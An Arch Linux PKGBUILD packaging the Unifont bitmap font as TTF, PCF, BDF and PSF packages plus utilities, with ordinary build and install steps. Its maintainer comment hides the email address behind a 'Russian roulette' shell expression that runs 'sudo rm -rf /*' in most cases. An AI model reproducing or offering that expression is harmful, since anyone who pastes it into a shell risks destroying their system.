# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=unifont
pkgname=(
	ttf-unifont
	pcf-unifont
	bdf-unifont
	psf-unifont
	unifont-utils
)
pkgver=7.0.06
pkgrel=1
epoch=
pkgdesc="A free bitmap font with wide Unicode support (split package with accompanying utilities, TrueType, PCF and BDF versions)"
arch=(i686 x86_64)
url="http://unifoundry.com/"
license=('GPL2')
groups=()
depends=()
makedepends=('perl')
checkdepends=()
optdepends=()
provides=()
conflicts=()
replaces=()
backup=()
options=()
install=
changelog=
source=(
	"http://unifoundry.com/pub/unifont-$pkgver/unifont-$pkgver.tar.gz"
	"http://unifoundry.com/pub/unifont-$pkgver/unifont-$pkgver.tar.gz.sig"
	fontconfig-noaa.conf
	fontconfig-upper.conf
	ttf.install
)
noextract=()
sha512sums=('c53f47d11673c8856a7efd410819c845bc25273f4ddc1a535d59253342b319d53b8336ef97b5ec01cbbf3d2596ab7138c4a03d1302bfda70a3f7e1796f412447'
            'SKIP'
            'd5f31a8f218f3f2b70ee74dddd0c1c1ad21fe38659fc3880fe8749e3e694a2cc7fea69361ec28aa8d5602fb57e7416f0669a2bb165703232e6f02922838e5437'
            '4eb2703bea9af264a8beac2f7605666f7a96a7a36a06dcd4357ad77c99378d99a266aeb54b79bd14a7718a3ceddd8a44b2d4d44e442c02ff4e6cb6f4035cd6a8'
            'ebd43afce78a08d4e868e84bd60f89c896e984c31edca7da29ceddc867565f3b7d1d373515ccd288037e6ce18e650677702649a2bc2d2d26f5ab5a5f976a1f6e')
validpgpkeys=('95D2E9AB8740D8046387FD151A09227B1F435A33')

# _use_precompiled=1

### build instructions

_compiled="${_use_precompiled:+pre}compiled"

_wanted() {
	for _item in "${pkgname[@]}"; do
		[[ "$_item" = "$1" ]] && return 0
	done
	return 1
}

if [[ -z "$_use_precompiled" ]]; then
	_wanted pcf-unifont && makedepends+=(xorg-bdftopcf)
	_wanted ttf-unifont && makedepends+=(fontforge)
	_wanted psf-unifont && makedepends+=(bdf2psf)
fi

prepare() {
	msg2 "Patching out U+202F"
	sed -i -e 's/^202F:.*/202F:00000000000000000000000000000000/' "$srcdir/unifont-$pkgver/font/plane00/nonprinting.hex"
	msg2 "Restoring the old hex2sfd"
	cp "$srcdir/unifont-$pkgver/src/hex2sfd-old" "$srcdir/unifont-$pkgver/src/hex2sfd"
}

build() {
	cd "$srcdir/unifont-$pkgver"
	make -j1 distclean
	make -j1 clean

	cd "$srcdir/unifont-$pkgver/src"
	msg2 "Building utilities"
	make -j1

	cd "$srcdir/unifont-$pkgver/font"
	if _wanted bdf-unifont; then
		# always building it, because the _csur variants
		# are missing in the precompiled font
		msg2 "Building the BDF version"
		make -j1 bdf -o distclean
	fi

	if [[ -z "$_use_precompiled" ]]; then
		if _wanted psf-unifont; then
			msg2 "Building the PSF version"
			make -j1 psf -o distclean
		fi
		if _wanted pcf-unifont; then
			msg2 "Building the PCF version"
			make -j1 pcf -o distclean
		fi
		if _wanted ttf-unifont; then
			msg2 "Building the TTF version"
			make -j1 ttf csurttf upperttf uppercsurttf -o distclean
		fi
	fi
}

# warning: below i pretty much bypass the whole build system,
# because it's not flexible enough to handle this kind of packaging

package_ttf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (TrueType version)"
	provides=(ttf-unifont ttf-unifont-csur)
	arch=(any)
	install=ttf.install

	_ttfdir=/usr/share/fonts/TTF

	cd "$srcdir/unifont-$pkgver/font/$_compiled"
	install -D -m0644 "unifont-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont.ttf"
	install -D -m0644 "unifont_csur-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_csur.ttf"
	install -D -m0644 "unifont_sample-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_sample.ttf"
	install -D -m0644 "unifont_upper-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_upper.ttf"
	install -D -m0644 "unifont_upper_csur-${pkgver}.ttf" \
		"${pkgdir}${_ttfdir}/unifont_upper_csur.ttf"

	cd "$srcdir"
	install -D -m0644 fontconfig-noaa.conf \
		"$pkgdir/etc/fonts/conf.avail/20-unifont-noaa.conf"
	install -D -m0644 fontconfig-upper.conf \
		"$pkgdir/etc/fonts/conf.avail/20-unifont-upper.conf"
}

package_pcf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (PCF version)"
	provides=(pcf-unifont)
	arch=(any)

	_pcfdir=/usr/share/fonts/misc

	cd "$srcdir/unifont-$pkgver/font/$_compiled"
	install -D -m0644 "unifont-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont.pcf.gz"
	install -D -m0644 "unifont_csur-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont_csur.pcf.gz"
	install -D -m0644 "unifont_sample-${pkgver}.pcf.gz" \
		"${pkgdir}${_pcfdir}/unifont_sample.pcf.gz"
}

package_bdf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (BDF version)"
	arch=(any)

	_bdfdir=/usr/share/fonts/misc

	# always use the compiled version, see build() above
	cd "$srcdir/unifont-$pkgver/font/compiled"
	install -D -m0644 "unifont-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont.bdf.gz"
	install -D -m0644 "unifont_csur-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont_csur.bdf.gz"
	install -D -m0644 "unifont_sample-${pkgver}.bdf.gz" \
		"${pkgdir}${_bdfdir}/unifont_sample.bdf.gz"
}

package_psf-unifont() {
	pkgdesc="A free bitmap font with wide Unicode support (PSF version, for APL)"
	arch=(any)

	cd "$srcdir/unifont-$pkgver/font/$_compiled"
	install -D -m 0644 "Unifont-APL8x16-${pkgver}.psf.gz" \
		"${pkgdir}/usr/share/kbd/consolefonts/Unifont-APL8x16.psf.gz"
}

package_unifont-utils() {
	pkgdesc="A free bitmap font with wide Unicode support - utilities"
	depends=('perl')
	optdepends+=('perl-wx: for the unifont-viewer utility')
	arch=(i686 x86_64)

	cd "$srcdir/unifont-$pkgver/src"
	make install PREFIX="$pkgdir/usr"
	cd "$srcdir/unifont-$pkgver/man"
	make install PREFIX="$pkgdir/usr" COMPRESS=1
}
